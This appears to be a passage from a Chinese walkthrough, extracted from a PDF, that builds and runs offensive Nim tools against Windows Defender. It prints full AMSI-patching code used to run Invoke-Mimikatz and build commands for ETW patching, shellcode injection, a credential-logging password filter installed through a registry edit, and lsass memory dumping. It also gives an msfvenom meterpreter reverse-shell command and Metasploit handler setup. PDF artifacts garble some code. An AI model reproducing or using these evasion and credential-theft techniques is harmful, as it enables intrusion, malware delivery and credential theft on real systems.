encrypt_decrypt_bin.nim 
作⽤
编译
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/self_delete_bin64.exe  src\self_delete_bin.ni
1
25
通过inlinehook AmsiScanBuﬀer函数绕过amsi检测。 
通过CLR调⽤运⾏powershell脚本。 
运⾏
amsi_patch_bin.nim && execute_powershell_bin.nim 
作⽤
编译
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/encrypt_decrypt_bin64.exe  src\encrypt_decrypt_bin.nim
1
26
运⾏
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/amsi_patch_bin64.exe  src\amsi_patch_bin.nim
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/execute_powershell_bin64.exe  src\execute_powershell_bin.nim
1
2
27
在windows defender的环境下测试amsi patch效果。⾸先运⾏"Invoke-Mimikatz"。 
提示检测到恶意内容，已被杀软拦截。
结合两份代码，在amsi patch完成后，通过CLR运⾏powershell代码，查看效果。 
28
Python
复制代码
#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause
]#
import winim/lean
import strformat
import dynlib
import winim/clr
import sugar
when defined amd64:
    echo "[*] Running in x64 process"
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 
0xC3]
elif defined i386:
    echo "[*] Running in x86 process"
    const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 
0xC2, 0x18, 0x00]
proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false
    # loadLib does the same thing that the dynlib pragma does and is the 
equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some 
checks in the code to make sure everything's ok (which you can't really 
do well when using LoadLibrary() directly through winim)
    amsi = loadLib("amsi")
    if isNil(amsi):
        echo "[X] Failed to load amsi.dll"
        return disabled
    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled
    if VirtualProtect(cs, patch.len, 0x40, addr op):
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
29
编译
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true
    return disabled
when isMainModule:
    var success = PatchAmsi()
    echo fmt"[*] AMSI disabled: {bool(success)}"
    echo "[*] Start Run Powershell \"Invoke-Mimikatz\"."
    var Automation = load("System.Management.Automation")
    #dump Automation
    var RunspaceFactory = 
Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactor
y")
    #dump RunspaceFactory
    var runspace = @RunspaceFactory.CreateRunspace()
    #dump runspace
    runspace.Open()
    var pipeline = runspace.CreatePipeline()
    #dump pipeline
    pipeline.Commands.AddScript("echo \"Invoke-Mimikatz\"")
    #pipeline.Commands.Add("Out-String")
    var results = pipeline.Invoke()
    for i in countUp(0,results.Count()-1):
        echo results.Item(i)
    #dump results
    echo results.isType()
    var t = results.GetType()
    #dump t
    discard readLine(stdin)
    #echo t.isType()
    #echo t.unwrap.vt
    runspace.Close()
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
30
运⾏
可以看到成功绕过了杀软对恶意内容的检测。
通过inlinehook EtwEventWrite函数绕过ETW⽇志记录。 
etw_patch_bin.nim 
作⽤
编译
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/amsi_patch_execute_powershell_bin64.exe  
src\amsi_patch_execute_powershell_bin.nim
1
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/etw_patch_bin64.exe  src\etw_patch_bin.nim
1
31
通过wmi查询安装的杀软和正在运⾏的进程。 
运⾏
wmiquery_bin.nim 
作⽤
编译
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/wmiquery_bin64.exe  src\wmiquery_bin.nim
1
32
运⾏
33
将.net模块压缩base64编码转换为powershell代码进⾏加载。 
out_compressed_dll_bin.nim 
作⽤
编译
34
编译提示函数参数类型错误，可能是nim版本太⾼，不兼容的问题，这⾥进⾏修改后再次编译。 
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/out_compressed_dll_bin64.exe  src\out_compressed_dll_bin.nim
1
35
动态注⼊到⾃身并执⾏shellcode。 
⾸先msfvenom⽣成64位反弹shellcode。 
运⾏
dynamic_shellcode_local_inject_bin.nim 
作⽤
编译
36
使⽤以下py代码将payload.bin⽂件内容转换为数组格式并替换源⽂件。 
Bash
复制代码
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.111.153 
LPORT=4444 -f raw -o payload.bin
1
Python
复制代码
import sys
def bin2byte_array(data):
    if len(data) ' % __file__)
    else:
        with open(sys.argv[1], 'rb') as f:
            data = f.read()
        print(bin2byte_array(data))
        print('length: %d' % len(data))
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
37
38
编译程序
启动MSF listener。 
运⾏
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/dynamic_shellcode_local_inject_bin64.exe  
src\dynamic_shellcode_local_inject_bin.nim
1
39
运⾏程序。
Bash
复制代码
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.111.153
set LPORT 4444
exploit -j
1
2
3
4
5
40
MSF控制台显示有session回连。 
切换到session。 
通过回调函数触发shellcode执⾏。 
⾸先替换shellcode为MSF reverse_tcp的shellcode。 
shellcode_callback_bin.nim 
作⽤
编译
41
运⾏
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/shellcode_callback_bin64.exe  src\shellcode_callback_bin.nim
1
42
MSF控制台收到session。 
以suspended状态创建傀儡进程，并通过创建远程线程的⽅式注⼊shellcode。 
替换代码中的shellcode部分。 
shellcode_bin.nim 
作⽤
编译
43
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/shellcode_bin64.exe  src\shellcode_bin.nim
1
44
MSF控制台收到session。 
通过创建纤程（ﬁber）执⾏shellcode。 
运⾏
shellcode_ﬁber.nim 
作⽤
编译
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/shellcode_fiber64.exe  src\shellcode_fiber.nim
1
45
通过在nim代码中内敛汇编存放shellcode。 
使⽤以下py代码⽣成shellcode数组替换shellcode部分。 
运⾏
shellcode_inline_asm_bin.nim 
作⽤
编译
46
运⾏
Python
复制代码
import sys
def bin2byte_array(data):
    return '.byte %s' % ','.join(['0x%02x' % i for i in data])
if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('usage:%s ' % __file__)
    else:
        with open(sys.argv[1], 'rb') as f:
            data = f.read()
        print(bin2byte_array(data))
        print('length: %d' % len(data))
1
2
3
4
5
6
7
8
9
10
11
12
13
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/shellcode_inline_asm_bin64.exe  src\shellcode_inline_asm_bin.nim
1
47
通过direct syscall调⽤绕过EDR hook执⾏shellcode。 
但作者并没有实现代码，⽽实现的是获取64位程序的TEB。 
syscalls_bin.nim 
作⽤
编译
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/syscall_bin64.exe  src\syscalls_bin.nim
1
48
注册密码修改回调函数，安装之后记录修改的密码到⽂件中。
⾸先需要⽤作者提供的⼀个安装脚本，但那个github仓库被删除了，⽤下⾯的链接获取安装脚本 
https://github.com/brownbelt/defcon-25-workshop/blob/master/src/passﬁlter/passﬁlter.bat 
根据当前路径修改为正确的脚本，如下
运⾏
passﬁlter_lib.nim 
作⽤
编译
运⾏
Bash
复制代码
nim cpp --app=lib --nomain --cpu=amd64 -d:release -d:strip --
out=bin/passfilter_lib64.dll src\passfilter_lib.nim
1
49
执⾏安装注册。
修改密码测试，没有测试成功。
dump lsass进程内存。 
minidump_bin.nim 
作⽤
编译
Bash
复制代码
copy "bin\passfilter_lib64.dll" "%WINDIR%\system32\passfilter.dll" /y
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification 
Packages" /d "scecli"\0"passfilter"\0 /t REG_MULTI_SZ /f
pause
1
2
3
4
5
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/minidump_bin64.exe src\minidump_bin.nim
1
50
nim语⾔的http请求，通过httpclient和com接⼝两种⽅式实现。 
运⾏
http_request_bin.nim 
作⽤
编译
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip -d:ssl --
out=bin/http_request_bin64.exe src\http_request_bin.nim
1
51
运⾏
52
通过COM组件GetObject不落地执⾏sct⽂件。 
远端测试sct⽂件内容 
execute_sct_bin.nim 
作⽤
编译
运⾏
Bash
复制代码
nim cc --app=console --cpu=amd64 -d:release -d:strip --
out=bin/execute_sct_bin64.exe src\execute_sct_bin.nim
1
53
scriptcontrol_bin.nim 
作⽤
Scala
复制代码
<![CDATA[
  function exec(){